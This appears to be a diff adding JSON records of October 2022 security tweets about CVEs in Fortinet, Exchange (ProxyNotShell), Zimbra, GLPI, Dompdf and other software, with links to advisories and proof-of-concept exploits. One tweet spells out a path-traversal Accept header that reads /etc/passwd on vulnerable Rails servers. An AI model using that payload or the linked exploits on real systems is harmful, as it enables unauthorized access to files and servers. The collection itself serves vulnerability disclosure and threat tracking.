+    "tweetfavorites": 382,
+    "tweetquotes": 13,
+    "tweetreplies": 6,
+    "tweetretweets": 169,
+    "tweettext": "With reports of #Fortinet CVE-2022-40684 being exploited in the wild, we have detailed some early Indicators of Compromise in the following blog to help organizations assess their environments.\n\nhttps://t.co/If9AJzubqg",
+    "tweettime": "2022-10-11, 19:42:12",
+    "tweeturl": "https://twitter.com/Horizon3Attack/status/1579920320685035520",
+    "username": "Horizon3Attack"
+}
+{
+    "expanded_url": [
+        "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-37968"
+    ],
+    "tweetfavorites": 45,
+    "tweetquotes": 5,
+    "tweetreplies": 1,
+    "tweetretweets": 29,
+    "tweettext": "📢 Azure Arc-enabled Kubernetes cluster Connect Elevation of Privilege Vulnerability\n\nCVSS 10 🚨\nCVE-2022-37968\n\nThis vuln could allow an unauthenticated user to elevate their privileges and gain administrative control over the Kubernetes cluster.\n\nhttps://t.co/79GthCQB6W",
+    "tweettime": "2022-10-11, 17:46:57",
+    "tweeturl": "https://twitter.com/fabian_bader/status/1579891317685252096",
+    "username": "fabian_bader"
+}
+{
+    "expanded_url": [
+        "https://asec.ahnlab.com/ko/39682/"
+    ],
+    "tweetfavorites": 136,
+    "tweetquotes": 9,
+    "tweetreplies": 4,
+    "tweetretweets": 59,
+    "tweettext": "According to @AhnLab_SecuInfo, there is a new Exchange 0day.\nDifferent from GTSC’s CVE-2022-41040, CVE-2022-41082.\n\nhttps://t.co/01xiQdIfwl",
+    "tweettime": "2022-10-11, 11:32:27",
+    "tweeturl": "https://twitter.com/SecuriTears/status/1579797071733100544",
+    "username": "SecuriTears"
+}
+{
+    "expanded_url": [
+        "https://thehackernews.com/2022/10/researchers-detail-critical-rce-flaw.html"
+    ],
+    "tweetfavorites": 85,
+    "tweetquotes": 9,
+    "tweetreplies": 3,
+    "tweetretweets": 64,
+    "tweettext": "Researchers warn of a recently reported critical RCE #vulnerability (CVE-2022-36067 / CVSS 10) in the popular vm2 #JavaScript sandbox module that could be exploited by hackers to overcome security barriers and perform arbitrary operations.\n\nRead: https://t.co/g4pI363lzN\n\n#infosec",
+    "tweettime": "2022-10-11, 11:29:29",
+    "tweeturl": "https://twitter.com/TheHackersNews/status/1579796325834838016",
+    "username": "TheHackersNews"
+}
+{
+    "expanded_url": [
+        "https://www.zerodayinitiative.com/advisories/ZDI-22-1327/"
+    ],
+    "tweetfavorites": 87,
+    "tweetquotes": 1,
+    "tweetreplies": 2,
+    "tweetretweets": 15,
+    "tweettext": "#CVE-2022-40146 Apache Batik DefaultScriptSecurity Server-Side Request Forgery Remote Code Execution Vulnerability. Reported by @chudyPB \n\nhttps://t.co/RssRbB0tur\n\nInterpreting JavaScript language though Rhino interpreter in my illustration. https://t.co/wPe66wCLGg",
+    "tweettime": "2022-10-11, 06:21:03",
+    "tweeturl": "https://twitter.com/pyn3rd/status/1579718705763987456",
+    "username": "pyn3rd"
+}
+{
+    "expanded_url": [
+        "https://talosintelligence.com/vulnerability_reports/TALOS-2022-1587"
+    ],
+    "tweetfavorites": 162,
+    "tweetquotes": 1,
+    "tweetreplies": 0,
+    "tweetretweets": 61,
+    "tweettext": "CVE-2022-31680 - VMware vCenter Server Platform Services Controller Unsafe Deserialization vulnerability\nMore details : https://t.co/as6CxB7pRg",
+    "tweettime": "2022-10-10, 16:45:55",
+    "tweeturl": "https://twitter.com/_Icewall/status/1579513570987216896",
+    "username": "_Icewall"
+}
+{
+    "expanded_url": [
+        "https://www.zerodayinitiative.com/advisories/ZDI-22-1407/"
+    ],
+    "tweetfavorites": 41,
+    "tweetquotes": 1,
+    "tweetreplies": 0,
+    "tweetretweets": 17,
+    "tweettext": "[ZDI-22-1407|CVE-2022-42431] Tesla bcmdhd Buffer Overflow Privilege Escalation Vulnerability (CVSS 8.8; Credit: @Synacktiv) https://t.co/smIsWEndp4",
+    "tweettime": "2022-10-10, 15:06:05",
+    "tweeturl": "https://twitter.com/TheZDIBugs/status/1579488445692628993",
+    "username": "TheZDIBugs"
+}
+{
+    "expanded_url": [
+        "https://github.com/CsEnox/CVE-2022-2992"
+    ],
+    "tweetfavorites": 32,
+    "tweetquotes": 0,
+    "tweetreplies": 2,
+    "tweetretweets": 7,
+    "tweettext": "#GitLab patches Remote Code Execution (#RCE) #vulnerability CVE-2022-2992. A great find by @wcbowling earning him a whopping $33,510 #BugBounty. The exploit #POC is now on GitHub:\n\nhttps://t.co/G3uiG8IARn",
+    "tweettime": "2022-10-10, 09:01:37",
+    "tweeturl": "https://twitter.com/securestep9/status/1579396722945822723",
+    "username": "securestep9"
+}
+{
+    "tweetfavorites": 1408,
+    "tweetquotes": 42,
+    "tweetreplies": 17,
+    "tweetretweets": 483,
+    "tweettext": "Another appliance vuln down... \n\nCVE-2022-40684, affecting multiple #Fortinet solutions, is an auth bypass that allows remote attackers to interact with all management API endpoints.\n\nBlog post and POC coming later this week. Patch now. https://t.co/YS7svIljAw",
+    "tweettime": "2022-10-10, 01:41:06",
+    "tweeturl": "https://twitter.com/Horizon3Attack/status/1579285863108087810",
+    "username": "Horizon3Attack"
+}
+{
+    "tweetfavorites": 223,
+    "tweetquotes": 2,
+    "tweetreplies": 4,
+    "tweetretweets": 58,
+    "tweettext": "#CVE-2022-41852 Apache Commons JXPath Remote Code Execution. Apparently, it’s a real RCE, however, the official vulnerability description misled me to wast too much time. https://t.co/vKsNTgFSyd",
+    "tweettime": "2022-10-09, 15:20:34",
+    "tweeturl": "https://twitter.com/pyn3rd/status/1579129700597010433",
+    "username": "pyn3rd"
+}
+{
+    "expanded_url": [
+        "https://github.com/rapid7/metasploit-framework/pull/17114"
+    ],
+    "tweetfavorites": 97,
+    "tweetquotes": 1,
+    "tweetreplies": 5,
+    "tweetretweets": 30,
+    "tweettext": "exploit for CVE-2022-41352:\nUnpatched Zero-Day Remote Code Execution Vulnerability in Zimbra Collaboration Suite \n#CVE  https://t.co/MmrRAGhxe7",
+    "tweettime": "2022-10-09, 13:33:16",
+    "tweeturl": "https://twitter.com/sirifu4k1/status/1579102701123616768",
+    "username": "sirifu4k1"
+}
+{
+    "tweetfavorites": 211,
+    "tweetquotes": 1,
+    "tweetreplies": 2,
+    "tweetretweets": 50,
+    "tweettext": "JXPath #CVE-2022-41852 is actually an RCE ....\n\nIdk what the description is on about 😂\n\n#CVE-2022-41852 RCE POC https://t.co/e84G2d3Onp",
+    "tweettime": "2022-10-09, 12:11:45",
+    "tweeturl": "https://twitter.com/TheGrandPew/status/1579082187106037762",
+    "username": "TheGrandPew"
+}
+{
+    "expanded_url": [
+        "https://thehackernews.com/2022/10/hackers-exploiting-unpatched-rce-flaw.html"
+    ],
+    "tweetfavorites": 76,
+    "tweetquotes": 3,
+    "tweetreplies": 1,
+    "tweetretweets": 65,
+    "tweettext": "Hackers are exploiting a severe UNPATCHED remote code execution #vulnerability (CVE-2022-41352) in Zimbra enterprise collaboration #software and email platform.\n\nRead: https://t.co/23UVGRpEzm\n\n#infosec #cybersecurity #hacking",
+    "tweettime": "2022-10-08, 07:50:56",
+    "tweeturl": "https://twitter.com/TheHackersNews/status/1578654161964781573",
+    "username": "TheHackersNews"
+}
+{
+    "expanded_url": [
+        "https://tantosec.com/blog/cve-2022-41343/"
+    ],
+    "tweetfavorites": 185,
+    "tweetquotes": 2,
+    "tweetreplies": 2,
+    "tweetretweets": 67,
+    "tweettext": "CVE-2022-41343:  PHP Dompdf RCE via Remote CSS Font Cache Installation...\nPoC\nhttps://t.co/pJTms92Hlb https://t.co/58qugTkNcG",
+    "tweettime": "2022-10-07, 10:08:13",
+    "tweeturl": "https://twitter.com/cyber_advising/status/1578326322127941632",
+    "username": "cyber_advising"
+}
+{
+    "tweetfavorites": 407,
+    "tweetquotes": 32,
+    "tweetreplies": 13,
+    "tweetretweets": 212,
+    "tweettext": "#Fortinet is currently advising it's customers on a high severity #vulnerability in \nFortiOS: From 7.0.0 to 7.0.6 and from 7.2.0 to 7.2.1\nFortiProxy: From 7.0.0 to 7.0.6 and 7.2.0\n#CVE: CVE-2022-40684\n\n#authbypass #RCE #prepareforimpact\n\n@campuscodi @uuallan @GossiTheDog https://t.co/eiVrtsozC0",
+    "tweettime": "2022-10-07, 08:21:37",
+    "tweeturl": "https://twitter.com/Gi7w0rm/status/1578299492822003712",
+    "username": "Gi7w0rm"
+}
+{
+    "tweetfavorites": 95,
+    "tweetquotes": 2,
+    "tweetreplies": 1,
+    "tweetretweets": 45,
+    "tweettext": "Mass scanning activity detected from multiple Tor exit nodes targeting Microsoft Exchange servers vulnerable to remote code execution (CVE-2022-41082). #threatintel #ProxyNotShell",
+    "tweettime": "2022-10-06, 21:30:02",
+    "tweeturl": "https://twitter.com/bad_packets/status/1578135518952439810",
+    "username": "bad_packets"
+}
+{
+    "tweetfavorites": 62,
+    "tweetquotes": 1,
+    "tweetreplies": 0,
+    "tweetretweets": 15,
+    "tweettext": "From #OBTS conference today: Ian Beer from @projectzero mentioned that CVE-2020-9907 was exploited in the wild. Thanks to @ZecOps @08Tc3wBB CVE-2020-9907 was reported to @Apple and patched, and will not be used against any iOS user that updated their device! https://t.co/4ZaNFg9TIB",
+    "tweettime": "2022-10-06, 19:38:49",
+    "tweeturl": "https://twitter.com/ZecOps/status/1578107531389329408",
+    "username": "ZecOps"
+}
+{
+    "tweetfavorites": 31,
+    "tweetquotes": 0,
+    "tweetreplies": 1,
+    "tweetretweets": 8,
+    "tweettext": "Let's look a little at this ProxyNotShell CVE-2022-41040 vulnerability. Per MS, it's a \"Server-Side Request Forgery (SSRF) vulnerability\"\nWhere have I seen that before?\nOh right, when it was first called CVE-2021-34473 in July 2021 as part of @orange_8361's ProxyShell. https://t.co/3MgheJTyfk",
+    "tweettime": "2022-10-06, 15:00:04",
+    "tweeturl": "https://twitter.com/wdormann/status/1578037381533503488",
+    "username": "wdormann"
+}
+{
+    "expanded_url": [
+        "https://buff.ly/3yi1b4T"
+    ],
+    "tweetfavorites": 128,
+    "tweetquotes": 0,
+    "tweetreplies": 2,
+    "tweetretweets": 9,
+    "tweettext": "On 9/29 two new Microsoft Exchange Server zero day attacks were reported.\n\nOur threat research team has released updated Web App Firewall signatures designed to mitigate in part the CVE-2022-41082 and CVE-2022-41040 vulnerabilities. Get the details here. https://t.co/vjLZcRXMy4",
+    "tweettime": "2022-10-06, 12:30:22",
+    "tweeturl": "https://twitter.com/CitrixADS/status/1577999707950948352",
+    "username": "CitrixADS"
+}
+{
+    "tweetfavorites": 72,
+    "tweetquotes": 2,
+    "tweetreplies": 1,
+    "tweetretweets": 42,
+    "tweettext": "[WARNING] Attackers are massively targeting &amp; exploiting RCE #vulnerability in #Sophos #firewall (CVE-2022-3236). \nTagged as T1562.003, T1574.006 &amp; T1574.007. Here are so far our vFeed Intel IoVs (indicators of vulnerability). https://t.co/H80IGlccdb",
+    "tweettime": "2022-10-06, 09:49:03",
+    "tweeturl": "https://twitter.com/ToolsWatch/status/1577959109416067073",
+    "username": "ToolsWatch"
+}
+{
+    "expanded_url": [
+        "https://tantosec.com/blog/cve-2022-41343/"
+    ],
+    "tweetfavorites": 200,
+    "tweetquotes": 4,
+    "tweetreplies": 1,
+    "tweetretweets": 77,
+    "tweettext": "This is the technical writeup in how we found and exploited the CVE-2022-41343 (RCE via Phar Deserialisation in Dompdf &lt;= v2.0.0). We presented this vulnerability at Ruxmon September and we are finally doing the public disclosure! I hope you like it ;-) https://t.co/DPgmK2ELXO",
+    "tweettime": "2022-10-06, 06:21:49",
+    "tweeturl": "https://twitter.com/marcioalm/status/1577906958023405568",
+    "username": "marcioalm"
+}
+{
+    "expanded_url": [
+        "https://rhynorater.github.io/CVE-2020-13379-Write-Up"
+    ],
+    "tweetfavorites": 73,
+    "tweetquotes": 0,
+    "tweetreplies": 0,
+    "tweetretweets": 23,
+    "tweettext": "Bug Bounty Writeup\n\nUnauthenticated Full-Read SSRF in Grafana from version 3.0.1 to 7.0.1 via chained Open-Redirects\n\nIn-depth description with multiple exploitation scenarios\n\n🔹 CVE-2020-13379\n\nhttps://t.co/ZicNbXF8UT",
+    "tweettime": "2022-10-06, 05:08:34",
+    "tweeturl": "https://twitter.com/therceman/status/1577888525646692358",
+    "username": "therceman"
+}
+{
+    "expanded_url": [
+        "https://bit.ly/3yditAg"
+    ],
+    "tweetfavorites": 42,
+    "tweetquotes": 2,
+    "tweetreplies": 1,
+    "tweetretweets": 24,
+    "tweettext": "CVE-2022-41040 and CVE-2022-41082 (aka #ProxyNotShell) can be used for remote code execution. Read our analysis and suggestions for how to mitigate. https://t.co/6986G9wa5x https://t.co/1FIMVviKBB",
+    "tweettime": "2022-10-05, 20:00:11",
+    "tweeturl": "https://twitter.com/Unit42_Intel/status/1577750518562275328",
+    "username": "Unit42_Intel"
+}
+{
+    "tweetfavorites": 387,
+    "tweetquotes": 4,
+    "tweetreplies": 7,
+    "tweetretweets": 110,
+    "tweettext": "Bug Bounty Tips\n\njQuery-UI XSS Payloads - Part 2\n\n🔹 CVE-2021-41184\n🔹 CVE-2016-7103\n🔹 CVE-2012-6662\n🔹 CVE-2010-5312 https://t.co/va9ggcTNB2",
+    "tweettime": "2022-10-04, 20:18:38",
+    "tweeturl": "https://twitter.com/therceman/status/1577392774890012674",
+    "username": "therceman"
+}
+{
+    "expanded_url": [
+        "https://youtu.be/inRhBK3IfRY",
+        "https://www.vulnmachines.com"
+    ],
+    "tweetfavorites": 50,
+    "tweetquotes": 2,
+    "tweetreplies": 2,
+    "tweetretweets": 25,
+    "tweettext": "oracle weblogic #rce | CVE-2021-2109 | CVE-2020-14882\nChaining of 2 CVEs (CVE-2020-14882 + CVE-2021-2109) authentication bypass to RCE\n\n[PoC] : https://t.co/cVN5N2JVg1\n\nStart your #pentesting journey with us.\nhttps://t.co/TKYo5q9VOB\n\n#bugbounty #bugbountytips #infosecurity",
+    "tweettime": "2022-10-04, 08:33:00",
+    "tweeturl": "https://twitter.com/Vulnmachines/status/1577215196757561344",
+    "username": "Vulnmachines"
+}
+{
+    "tweetfavorites": 285,
+    "tweetquotes": 3,
+    "tweetreplies": 4,
+    "tweetretweets": 115,
+    "tweettext": "[Oh noo] Two new #0day vulnerabilities affecting Microsoft Exchange Server (CVE-2022-41040, CVE-2022-41082) exploited in the wild\n\nHow to search for it at mass scale\n👇 🚨\n\n#exchange #microsoft #recon #AttackSurface #bugbountytips #bugbounty #cve2022 #ProxyNotShell #rce https://t.co/NobzbFXPsi",
+    "tweettime": "2022-10-03, 10:34:28",
+    "tweeturl": "https://twitter.com/ReconOne_bk/status/1576883375964844032",
+    "username": "ReconOne_bk"
+}
+{
+    "expanded_url": [
+        "https://mayfly277.github.io/posts/GLPI-htmlawed-CVE-2022-35914/"
+    ],
+    "tweetfavorites": 202,
+    "tweetquotes": 3,
+    "tweetreplies": 2,
+    "tweetretweets": 79,
+    "tweettext": "CVE-2022-35914 - GLPI unauthenticated RCE with htmlawed lib\nhttps://t.co/FmRuiOxEQe\nTL;DR https://t.co/MO9jbxkwX6",
+    "tweettime": "2022-10-03, 10:03:48",
+    "tweeturl": "https://twitter.com/M4yFly/status/1576875657732435968",
+    "username": "M4yFly"
+}
+{
+    "expanded_url": [
+        "https://www.youtube.com/watch?v=cjg9FJFoezo"
+    ],
+    "tweetfavorites": 208,
+    "tweetquotes": 5,
+    "tweetreplies": 17,
+    "tweetretweets": 94,
+    "tweettext": "Here is an RCE demo for Cobalt Strike CVE-2022-39197. Like @0x09AL said the patch is not a complete fix, be careful. Also I don't want to see any more java code for a while, holy f. Maybe at some point I will post some patch analysis 🥃\nhttps://t.co/CVZ1ZgwcQ6",
+    "tweettime": "2022-10-02, 13:31:35",
+    "tweeturl": "https://twitter.com/FuzzySec/status/1576565560812269569",
+    "username": "FuzzySec"
+}
+{
+    "tweetfavorites": 587,
+    "tweetquotes": 3,
+    "tweetreplies": 14,
+    "tweetretweets": 153,
+    "tweettext": "My 2nd RoR 'CVE-2019-5418' LFI in last 15 days. This is 3 years old bug and still exists... The page gives 404, but the buggy app is still in the server running. \n\nAdd \"Accept: ../../../../../../../../etc/passwd{{\" to GET Request and read /etc/passwd #bugbountytips  #BugBounty https://t.co/lHooK4hgAM",
+    "tweettime": "2022-10-02, 11:27:27",
+    "tweeturl": "https://twitter.com/nav1n0x/status/1576534319824138240",
+    "username": "nav1n0x"
+}
+{
+    "expanded_url": [
+        "https://github.com/cosad3s/CVE-2022-35914-poc"
+    ],
+    "tweetfavorites": 141,
+    "tweetquotes": 2,
+    "tweetreplies": 1,
+    "tweetretweets": 39,
+    "tweettext": "CVE-2022-35914: /vendor/htmlawed/htmlawed/htmLawedTest.php in the htmlawed module for GLPI through 10.0.2 allows PHP code injection.\n\nPoC\nhttps://t.co/PNNp7mTsiw https://t.co/YC46Q4fC6N",
+    "tweettime": "2022-10-02, 10:05:51",
+    "tweeturl": "https://twitter.com/cyber_advising/status/1576513784721862656",
+    "username": "cyber_advising"
+}
+{
+    "expanded_url": [
+        "https://github.com/CronUp/Vulnerabilidades/blob/main/proxynotshell_checker.nse"
+    ],
+    "tweetfavorites": 1767,
+    "tweetquotes": 11,
+    "tweetreplies": 22,
+    "tweetretweets": 580,
+    "tweettext": "I wrote a quick Nmap script to scan for servers potentially vulnerable to #ProxyNotShell (based on Microsoft's recommended URL blocking rule) I hope it can be useful for someone :)\n\n[+] https://t.co/QsCw3D0dr7\n\n#0day CVE-2022-40140 CVE-2022-41082 https://t.co/7Rzghqsfyi",
+    "tweettime": "2022-10-02, 07:15:51",
+    "tweeturl": "https://twitter.com/1ZRR4H/status/1576471006373613569",
+    "username": "1ZRR4H"
+}
